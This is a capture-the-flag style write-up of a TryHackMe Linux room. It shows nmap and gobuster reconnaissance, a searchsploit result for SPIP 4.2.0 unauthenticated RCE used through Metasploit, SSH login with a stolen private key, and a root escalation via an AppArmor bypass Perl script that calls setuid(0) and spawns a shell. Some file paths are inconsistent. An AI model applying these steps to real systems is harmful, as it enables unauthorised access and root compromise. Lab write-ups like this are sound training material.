
---
# 1. Overview

```
- Platform - Tryhackme
- Difficulty - Easy
- Operating System - Linux
- Skills Learned - Privilege Escalation
```

---
# 2. Reconnaissance 

## - Nmap result

```
nmap -sC -sV -A -O 10.49.129.170
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-29 14:11 IST
Nmap scan report for 10.49.129.170
Host is up (0.013s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 cc:39:03:33:19:17:e4:92:bd:da:6a:0a:b2:66:81:eb (RSA)
|   256 af:13:27:02:4e:f8:4f:8d:f0:9d:e0:0b:ae:12:3f:e0 (ECDSA)
|_  256 52:fc:87:a6:f2:1d:99:14:32:17:ee:d2:31:89:0d:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/29%OT=22%CT=1%CU=35286%PV=Y%DS=24%DC=T%G=Y%TM=6AE30
OS:6E4%P=x86_64-pc-linux-gnu)SEQ()SEQ(TS=A)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI
OS:=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=
OS:1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8N
OS:NT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3
OS:=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%
OS:S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T7(R=N)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=N)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=Y%DF
OS:I=N%T=40%CD=S)

Network Distance: 24 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT     ADDRESS
1   8.37 ms 192.168.128.1
2   ... 23
24  8.09 ms 10.49.129.170

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.15 seconds
```

```
- So we have a http site running on port 80 so i visited it for further recon.
  
- This is what we got after visiting the site so i searched for other directories using tools like - gobuster, dirsearch, dirb
  
- After further recon i got this directory - /spip
```
## - Gobuster result

```
gobuster dir -u "http://10.49.129.170/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x js,php,txt,html,git
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.129.170/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,php,txt,html,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.49.129.170/images/]
/index.html           (Status: 200) [Size: 8686]
/spip                 (Status: 301) [Size: 313] [--> http://10.49.129.170/spip/]
/server-status        (Status: 403) [Size: 278]

```

![[Pasted image 20261029142353.png]]

![[Pasted image 20261029142813.png]]

---
# 3. Initial Access

```
- After recon i tried to get the intitial access by searching about spip on searchsploit
  
searchsploit spip 4.2.0   
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
SPIP v4.2.0 - Remote Code Execution (Unauthenticated)            | php/webapps/51536.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

- There is rce vulnerability on this version of spip so we can try to get the reverse shell using msfconsole.    
```

```
msfconsole
Metasploit tip: Use the edit command to open the currently active module 
in your editor    
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


      =[ metasploit v6.4.99-dev                                ]
+ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,683 payloads     ]
+ -- --=[ 433 post - 49 encoders - 13 nops - 9 evasion          ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > 

```

![[Pasted image 20261029143511.png]]
=![[Pasted image 20261029143653.png]]

![[Pasted image 20261029144036.png]]

---
# 4. Privilege Escalation

```
- After getting shell we can try for privilege escalation.
```

![[Pasted image 20261029144332.png]]

```
- so i changed directory to /home and there was directory think so i went into it and got the user flag and now we have to escalate privelege to root.

- I tried sudo -l what kind permissions we have as a normal user.
```

![[Pasted image 20261029144438.png]]

```
- After trying sudo -l we didnt got any permissions to run but there is a dir named as .ssh so i opened it
```

![[Pasted image 20261029145636.png]]

```
- Once getting the key i downloaded it in my main machine and changed the permission to execute it in order to get the ssh connection.
  - cd .ssh
  - chmod 600 id_rsa
  - ssh -i id_rsa think@10.49.129.170
    
- As part of standard Linux privilege escalation methodology, I searched for binaries with the SUID bit set:

	"find / -perm -u=s -type f 2>/dev/null"

 - Among the results, one binary stood out:

	"/usr/sbin/run_container"

```

![[Pasted image 20261029163238.png]]

```
- in this lab we have a hint.
```

![[Pasted image 20261029164016.png]]

```
The clue tells us to filter all the system services that are running and inspect that app’s security to find misconfiguration, overly permissive rules, and paths the profile allows.

service --status-all | grep '+' - using this command we got to see apparmour
```

```
 - Among the results, one binary stood out:

	"/usr/sbin/run_container"

Checking its permissions:

	"ls -la /opt/run_container.sh"

 - Despite the file appearing writable, the system consistently denied modification attempts.

Further investigation revealed:

- The `/opt` directory itself did not allow write operations.
- The current shell was running under **ash**, not bash.

At this point, the privilege escalation was not straightforward.


```

```
To bypass these restrictions we used apparmour bypass commands by hacktricks, I leveraged a Perl-based privilege escalation technique to spawn a different shell context:

**echo '#!/usr/bin/perl  
use POSIX qw(strftime);  
use POSIX qw(setuid);  
POSIX::setuid(0);  
exec "/bin/sh"' > /dev/shm/test.pl  
chmod +x /dev/shm/test.pl  
/dev/shm/test.pl**
```

![[Pasted image 20261029165627.png]]

```
- This helped me to gain root access and get the root file.
```

---
# 5. Key Findings

```
- Older version of spip which had rce.
- Apparmour bypass using hacktricks website.
- One executable binary by user too - "/usr/sbin/run_container"
```

---
# 6. Tools Used

```
- Nmap
- Gobuster
- Hacktricks
- ssh
```

---
